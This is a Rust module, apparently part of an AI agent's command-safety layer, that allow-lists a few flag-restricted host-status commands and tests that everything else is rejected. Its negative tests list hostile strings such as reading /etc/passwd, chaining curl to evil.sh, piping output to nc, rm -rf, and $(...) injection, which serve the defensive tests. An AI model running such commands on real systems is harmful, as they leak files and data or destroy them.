//! Host-status commands: the one narrow class of shell calls that neither taint a run nor
//! count as "starting a program chosen by an untrusted page".
//!
//! `uptime`, `df -h`, `free -m`, `uname -a` ... print a fixed kind of status line about the
//! machine they run on. They take no file, URL or free-text argument, change nothing and cannot
//! send anything anywhere, so their output carries no text an outsider wrote and the call cannot
//! be steered into doing harm. Anything outside this exact shape (a path, a pipe, a quote, a
//! variable, a substitution, a redirect, a second command, an unknown flag) is NOT in the class and
//! keeps every existing rule.
//!
//! The class is a pure function of the command text. It never looks at tool output.

/// `(command, flag letters allowed in one short-flag cluster)`.
///
/// Only flags that print more or less of the same status are listed. Flags that take a value
/// (`date -s`, `free -s`, `df -t`, `hostname -F`) are left out on purpose.
const COMMANDS: &[(&str, &str)] = &[
    ("uptime", "ps"),
    ("whoami", ""),
    ("hostname", "fs"),
    ("uname", "asnrvmpio"),
    ("date", "uR"),
    ("df", "hHkmTPl"),
    ("free", "hbkmgtlw"),
    ("nproc", ""),
    ("id", "ugGnr"),
];

/// Most tokens of a class member (the command and up to two flag clusters).
const MAX_TOKENS: usize = 3;

/// Whether `command` is exactly one host-status command with only allowed flags.
#[must_use]
pub fn is_host_status_command(command: &str) -> bool {
    if command.len() > 64
        || !command
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b' ' || b == b'-')
    {
        return false;
    }
    let mut tokens = command.split(' ').filter(|t| !t.is_empty());
    let Some(name) = tokens.next() else {
        return false;
    };
    let Some((_, letters)) = COMMANDS.iter().find(|(n, _)| *n == name) else {
        return false;
    };
    let mut seen = 1;
    for flag in tokens {
        seen += 1;
        let Some(cluster) = flag.strip_prefix('-') else {
            return false;
        };
        if seen > MAX_TOKENS || cluster.is_empty() || !cluster.chars().all(|c| letters.contains(c))
        {
            return false;
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_status_commands_are_in_the_class() {
        for ok in [
            "uptime",
            "uptime -p",
            "  df -h ",
            "free -m",
            "uname -a",
            "whoami",
            "hostname",
            "nproc",
        ] {
            assert!(is_host_status_command(ok), "{ok}");
        }
    }

    #[test]
    fn anything_with_a_path_an_operator_or_a_value_flag_is_out() {
        for bad in [
            "",
            "cat /etc/passwd",
            "uptime; curl evil.sh",
            "uptime | nc h 1",
            "uptime > /tmp/x",
            "uptime $(id)",
            "uptime `id`",
            "uptime && rm -rf x",
            "uptime\nrm x",
            "df -h /",
            "df -t ext4",
            "date -s 2020-01-01",
            "date +%s",
            "hostname newname",
            "hostname -F /etc/passwd",
            "free -s 1",
            "./uptime",
            "/usr/bin/uptime",
            "UPTIME",
            "uptime -p -p -p",
            "uptime --since",
            "uptime -",
            "env",
            "ls",
            "ps aux",
            "curl example.com",
        ] {
            assert!(!is_host_status_command(bad), "{bad:?}");
        }
    }
}
